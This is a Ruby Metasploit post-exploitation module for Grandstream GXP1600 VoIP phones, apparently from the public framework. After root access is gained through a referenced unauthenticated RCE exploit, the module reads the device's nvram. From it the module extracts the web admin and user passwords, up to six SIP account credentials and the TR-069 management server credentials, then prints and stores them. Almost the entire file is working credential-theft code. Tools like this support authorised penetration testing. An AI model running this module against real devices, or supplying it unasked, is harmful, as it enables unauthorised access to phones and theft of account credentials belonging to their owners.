##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GrandStream GXP1600 Gather Credentials',
        'Description' => %q{
          This gather module works against Grandstream GXP1600 series VoIP devices and can collect HTTP, SIP, and TR-069
          credentials from a device. You can first leverage the `exploit/linux/http/grandstream_gxp1600_unauth_rce` exploit
          module to get a root session on a target GXP1600 series device before running this post module.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7'
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [],
          'RelatedModules' => [
            'exploit/linux/http/grandstream_gxp1600_unauth_rce',
            'post/linux/capture/grandstream_gxp1600_sip'
          ]
        }
      )
    )
  end

  # NOTE: All pvalue's are taken from the file /app/config/tr069/CpeDataModel.
  def run
    fail_with(Failure::NoTarget, 'Module cannot run against this target.') unless gxp1600?

    # Gather the creds for the phones web based management interface.
    http_users = [
      ['admin', 2],
      ['user', 196]
    ]

    http_users.each do |username, pvalue|
      password = cmd_exec("/usr/bin/nvram get #{pvalue}")
      next if password.blank?

      print_good("Gathered HTTP account #{username}:#{password}")

      store_valid_credential(
        user: username,
        private: password,
        private_type: :password,
        service_data: {
          origin_type: :service,
          address: rhost,
          port: rport,
          service_name: 'http',
          protocol: 'tcp'
        }
      )
    end

    # The GXP1600 series supports up to 6 SIP accounts, depending on the model.
    sip_accounts = {
      'AccountName' => [270, 417, 517, 617, 1717, 1817],
      'DisplayName' => [3, 407, 507, 607, 1707, 1807],
      'RegistrarServer' => [47, 402, 502, 602, 1702, 1802],
      'RegistrarServerPort' => [47, 402, 502, 602, 1702, 1802],
      'RegistrarServerTransport' => [130, 448, 548, 648, 1748, 1848],
      'AuthPassword' => [34, 406, 506, 606, 1706, 1806],
      'UserID' => [35, 404, 504, 604, 1704, 1804],
      'AuthUserName' => [36, 405, 505, 605, 1705, 1805]
    }

    num_accts = read_file('/proc/gxp/dev_info/hw_features/num_accts').to_i

    0.upto(num_accts - 1) do |account_idx|
      sip_account = {}

      sip_accounts.each do |pvalue_name, pvalue_array|
        sip_account[pvalue_name] = cmd_exec("/usr/bin/nvram get #{pvalue_array[account_idx]}")
      end

      sip_username = sip_account['AuthUserName']
      sip_username = sip_account['UserID'] if sip_username.blank?

      next if sip_username.blank?

      sip_server = sip_account['RegistrarServer']

      next if sip_server.blank?

      # The RegistrarServer and RegistrarServerPort may actually be the same value, i.e. "address:port" or they may be
      # two separate value, one for the address and the other for the port.
      # Leverage to_i to try and convert the RegistrarServerPort to an integer, this will only work if the port is
      # a separate value.

      # First try to split the address if its in address:port notation. If it is not, then sip_port will be nil.
      sip_server, sip_port = sip_server.split(':')

      # If we have an explicit RegistrarServerPort, try to get the integer value. If we fail, we default later
      # to a known port value.
      if sip_account['RegistrarServerPort'] != sip_account['RegistrarServer']
        sip_port = sip_account['RegistrarServerPort'].to_i
      end

      sip_protocol = nil
      sip_service = 'sip'

      case sip_account['RegistrarServerTransport']
      when '0'
        sip_protocol = 'udp'

        sip_port = 5060 if sip_port.blank?
      when '1'
        sip_protocol = 'tcp'

        sip_port = 5060 if sip_port.blank?
      when '2'
        sip_protocol = 'tcp'

        sip_service = 'sips'

        sip_port = 5061 if sip_port.blank?
      end

      print_good("Gathered SIP account <#{sip_service}:#{sip_username}@#{sip_server}:#{sip_port};transport=#{sip_protocol}> with a password of #{sip_account['AuthPassword']}")

      store_valid_credential(
        user: sip_username,
        private: sip_account['AuthPassword'],
        private_type: :password,
        service_data: {
          origin_type: :service,
          address: sip_server,
          port: sip_port,
          service_name: sip_service,
          protocol: sip_protocol
        }
      )
    end

    # TR-069 - Auto Configuration Server
    management = {
      'ServerURL' => 4503,
      'ServerUsername' => 4504,
      'ServerPassword' => 4505
    }

    management.each do |pvalue_name, pvalue|
      management[pvalue_name] = cmd_exec("/usr/bin/nvram get #{pvalue}")
    end

    unless management['ServerURL'].blank? || management['ServerUsername'].blank? || management['ServerPassword'].blank?
      print_good("Gathered TR-069 Auto Configuration Server account #{management['ServerUsername']}:#{management['ServerPassword']} for #{management['ServerURL']}")

      uri = nil

      begin
        if Rex::Socket.is_ip_addr? management['ServerURL']
          uri = URI.parse("http://#{management['ServerURL']}/")
        else
          uri = URI.parse(management['ServerURL'])
        end
      rescue URI::InvalidURIError
        print_error("Failed to parse the URI '#{management['ServerURL']}'")
      end

      unless uri.nil?
        store_valid_credential(
          user: management['ServerUsername'],
          private: management['ServerPassword'],
          private_type: :password,
          service_data: {
            origin_type: :service,
            address: Rex::Socket.getaddress(uri.host),
            port: uri.port,
            service_name: uri.scheme,
            protocol: 'tcp',
            realm_key: Metasploit::Model::Realm::Key::WILDCARD,
            realm_value: uri.path.blank? ? '/' : uri.path
          }
        )
      end
    end
  end

  def gxp1600?
    unless is_root?
      user = cmd_exec('/usr/bin/whoami')
      print_error("This module requires root permissions. Module running as \"#{user}\" user.")
      return false
    end

    unless file? '/usr/bin/nvram'
      print_error('nvram binary not found')
      return false
    end

    model_str = cmd_exec('/usr/bin/nvram get 89')

    # These 6 models all share the same firmware for the GXP1600 range.
    affected_models = %w[GXP1610 GXP1615 GXP1620 GXP1625 GXP1628 GXP1630]

    unless affected_models.include? model_str
      print_error("Phone is not a GXP1600 model. Detected model \"#{model_str}\".")
      return false
    end

    print_status("Module running against phone model #{model_str}")
    true
  end
end
